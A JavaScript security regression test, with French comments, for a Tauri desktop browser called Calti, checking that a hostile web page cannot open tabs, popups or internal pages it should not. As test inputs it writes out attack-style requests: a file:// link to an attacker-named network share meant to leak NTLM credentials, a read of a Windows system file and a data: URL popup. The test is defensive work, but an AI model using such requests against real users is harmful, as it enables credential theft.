// Correctifs de l'audit de sécurité : ce qu'une page web malveillante ne doit plus pouvoir faire.
//   powershell -File scripts\tests\run.ps1 security.test.cjs
const fs = require("fs");
const path = require("path");
const { connect, sleep, suite } = require("./cdp.cjs");

const t = suite();
const invoke = (cmd, args = {}) => `window.__TAURI_INTERNALS__.invoke(${JSON.stringify(cmd)}, ${JSON.stringify(args)})`;
const tabs = (ui) => ui.ev(`${invoke("browser_tabs")}`);
const run = (ui, id, script) => ui.ev(`${invoke("browser_eval", { id, script })}`);

(async () => {
  let ui = await connect();
  await ui.ev(`localStorage.clear(); localStorage.setItem("calti.settings.v3", JSON.stringify({ theme: {}, profiles: { essai: { name: "Essai" } }, profileOrder: ["essai"] })); location.reload()`);
  ui.close();
  await sleep(3500);
  ui = await connect();
  for (let i = 0; i < 40 && !(await ui.ev(`!!document.querySelector(".pane__address input")`)); i++) await sleep(250);

  await ui.ev(`${invoke("browser_open", { profile: "essai", url: "https://example.org/?attaque" })}`);
  let page = null;
  for (let i = 0; i < 60 && !(page && !page.loading); i++) { page = (await tabs(ui)).find((x) => x.url.includes("?attaque")); await sleep(250); }
  const count = async () => (await tabs(ui)).length;

  // 1. Lien en arrière-plan demandé par la page vers un partage réseau (fuite NTLM) : refusé.
  let before = await count();
  await run(ui, page.id, `chrome.webview.postMessage(JSON.stringify({ calti: "open-background", url: "file://attaquant.example/partage/x.html" }))`);
  await run(ui, page.id, `chrome.webview.postMessage(JSON.stringify({ calti: "open-background", url: "file:///C:/Windows/win.ini" }))`);
  await sleep(1200);
  t.check("lien file:// demandé par une page refusé", (await count()) === before);

  // 2. Rafale de liens en arrière-plan : un seul passe.
  before = await count();
  await run(ui, page.id, `for (let i = 0; i < 6; i++) chrome.webview.postMessage(JSON.stringify({ calti: "open-background", url: "https://example.com/?rafale-" + i }))`);
  await sleep(2500);
  const burst = (await tabs(ui)).filter((x) => x.url.includes("?rafale-") || x.title.includes("rafale")).length;
  t.check("rafale de liens limitée à un onglet", (await count()) - before === 1, `${(await count()) - before} onglet(s), ${burst}`);

  // 3. window.open vers un fichier ou des données : refusé ; vers le web : ouvert (contrôle).
  before = await count();
  await run(ui, page.id, `window.open("file://attaquant.example/partage/y.html"); window.open("data:text/html,<h1>faux</h1>")`);
  await sleep(1500);
  t.check("window.open file: et data: refusés", (await count()) === before);
  await run(ui, page.id, `window.open("https://example.com/?popup-web")`);
  let popped = false;
  for (let i = 0; i < 20 && !popped; i++) { popped = (await tabs(ui)).some((x) => x.url.includes("popup-web")); await sleep(250); }
  t.check("window.open vers le web ouvert (contrôle)", popped);

  // 4. L'onglet ne peut pas charger l'interface de Calti.
  await run(ui, page.id, `location.href = "http://tauri.localhost/index.html"`);
  await sleep(1500);
  const after = (await tabs(ui)).find((x) => x.id === page.id);
  t.check("interface de Calti refusée dans un onglet", after && !after.url.includes("tauri.localhost"), after?.url);

  // 5. Adresses et chemins jamais envoyés au moteur de suggestions (règle lue dans le code source).
  const source = fs.readFileSync(path.join(__dirname, "..", "..", "app", "src", "browser", "webSuggestions.ts"), "utf8");
  const body = source.match(/export function looksLikeAddress\(q: string\): boolean \{([\s\S]*?)\n\}/)[1];
  const looksLikeAddress = new Function("q", body);
  const addresses = ["https://intranet.local/?token=abc", "C:\\Users\\moi\\secret.pdf", "\\\\serveur\\partage", "gitlab.interne:8443",
    "192.168.1.20", "localhost:3000", "exemple.fr/page", "moi@exemple.fr"];
  const searches = ["recette crêpes", "météo", "rust async", "c'est quoi un vhdx"];
  const leaked = addresses.filter((a) => !looksLikeAddress(a));
  const blocked = searches.filter((q) => looksLikeAddress(q));
  t.check("adresses et chemins non envoyés au moteur", !leaked.length, leaked.join(" · "));
  t.check("les vraies recherches le sont (contrôle)", !blocked.length, blocked.join(" · "));

  // 6. Historique du presse-papiers jamais recopié dans etat.json.
  await ui.ev(`localStorage.setItem("calti.clipboard", JSON.stringify([{ id: "x", kind: "text", text: "mot-de-passe-secret-42", at: Date.now() }])); localStorage.setItem("calti.notes.essai-temoin", "témoin-miroir")`);
  const file = path.join(process.env.WEBVIEW2_USER_DATA_FOLDER, "etat.json");
  let mirror = "";
  for (let i = 0; i < 30 && !mirror.includes("témoin-miroir"); i++) { await sleep(500); mirror = fs.existsSync(file) ? fs.readFileSync(file, "utf8") : ""; }
  t.check("copie de sécurité à jour (contrôle)", mirror.includes("témoin-miroir"));
  t.check("presse-papiers absent de la copie", !mirror.includes("mot-de-passe-secret-42") && !mirror.includes("calti.clipboard\""));

  t.report();
  ui.close();
})().catch((e) => { console.error(e); process.exitCode = 1; }).finally(() => setTimeout(() => process.exit(), 200));
